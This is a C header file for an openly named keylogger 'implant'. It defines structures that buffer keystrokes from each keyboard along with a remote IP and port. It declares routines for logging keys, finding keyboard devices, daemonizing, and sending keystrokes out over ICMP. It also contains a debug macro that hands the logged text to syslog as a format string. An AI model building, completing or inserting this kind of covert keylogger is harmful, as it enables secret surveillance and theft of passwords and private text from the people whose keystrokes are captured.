
#ifndef IMPLANT_H
#define IMPLANT_H

#include <stdint.h>
#include <sys/queue.h>
#include <sys/types.h>
#include <unistd.h>

#define QUEUE_BUFFER_SIZE 1024

#define STRING_BUFFER_SIZE 256

/*
    represents whatever data is currently logged for a single keyboard
    also holds its file descriptor
*/
typedef struct keyboard_s keyboard_t;
struct keyboard_s {
    int fd;

    ssize_t nb_chars;
    char buffer[QUEUE_BUFFER_SIZE];

    char name[STRING_BUFFER_SIZE];
    TAILQ_ENTRY(keyboard_s)
    devices;
};

/*
    contains project settings, such as target
    port & IP address, whether debug mode is enabled
    or stuff like this
*/
typedef struct implant_s {

    /* remote connection settings */
    unsigned short port;
    char ip[STRING_BUFFER_SIZE];
    int disable_net;

    /* keyboard settings (multiple if using dock or something) */
    TAILQ_HEAD(listhead, keyboard_s)
    kbd;

    uint8_t using_caps_lock;
} implant_t;

#define SUCCESSFUL 1
#define ERROR 0

#include <stdio.h> /* necessary for the snprintf in the macro */
#include <syslog.h>

#ifndef DEBUG_LOG
#define DEBUG_LOG(s, ...)                              \
    do {                                               \
        char data[256] = {0};                          \
        if (0 > snprintf(data, 255, s, ##__VA_ARGS__)) \
            _exit(1);                                  \
        syslog(LOG_NOTICE, data);                      \
    } while (0)
#endif

#define KEY_PRESSED 1
#define KEY_RELEASED 0

// net.c
int retrieve_ip_address(char *ip[32]);
int send_key_icmp(implant_t *, struct input_event);

// opt.c
int parse_user_input(int, char **, implant_t *);

// logger.c
void keylog(implant_t *);

// keyboard.c
void fetch_available_keyboards(implant_t *);

// daemon.c
void daemon_setup(void);

// utils.c
int read_file(char const *, char **);
size_t
get_array_size(uint8_t **);
char *
remove_repeating_whitespaces(char *);
void free_tab(uint8_t **);
char **
tabgen(const char *, char);

#endif /* IMPLANT_H */
